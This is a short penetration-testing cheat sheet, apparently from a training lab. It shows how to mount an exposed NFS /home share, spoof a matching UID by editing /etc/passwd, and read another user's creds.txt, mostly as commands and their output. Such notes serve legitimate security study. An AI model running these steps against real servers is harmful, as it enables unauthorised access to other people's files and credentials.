# NFS
# scan port 111
# then use nmap nfs scripts to scan where it redirects you to
# try mounting

mkdir home
sudo mount -o nolock 10.11.1.72:/home ~/home/

# `-o nolock` disables file locking, required for old NFS servers


# if you can't access a file because of permissions assigned to a uid
# just create a new user
adduser

# and change its uid

sudo sed -i -e 's/1001/1014/g' /etc/passwd

# then switch user
su newuser

# and you will have permission



# Those on the latest Kali linux will receive an error while trying to exploit the NFS service.
```
cat: marcus/creds.txt: Input/output error
```

# If you get this, try using a deliberately outdated NFSv3 client:
$ mkdir -p /tmp/home
$ docker run -it --privileged=true --name nfs --net=host -v /tmp/home:/mnt/nfs-1:shared -e SERVER=10.11.1.72 -e SHARE=/home d3fk/nfs-client
$ ls -la /tmp/home /tmp/home/marcus
/tmp/home:
total 40
drwxr-xr-x  7 root root  4096 Sep 17  2015 .
drwxrwxrwt 19 root root 16384 Sep 26 23:30 ..
drwxr-xr-x  2 1013 1013  4096 Sep 17  2015 jenny
drwxr-xr-x  2 1012 1012  4096 Sep 17  2015 joe45
drwxr-xr-x  2 1011 1011  4096 Sep 17  2015 john
drwxr-xr-x  2 1014 1014  4096 Oct 27  2019 marcus
drwxr-x---  3 root 1010  4096 Jan  8  2015 ryuu

/tmp/home/marcus:
total 12
drwxr-xr-x 2 1014 1014 4096 Oct 27  2019 .
drwxr-xr-x 7 root root 4096 Sep 17  2015 ..
-rwx------ 1 1014 1014   48 Oct 27  2019 creds.txt

$ sudo adduser pwn1
# edit `/etc/passwd` and `/etc/group` to replace uid and gid with target 1014
$ sudo su pwn1

$ cat /tmp/home/marcus/creds.txt
Not what you are looking for, try harder!!! :O)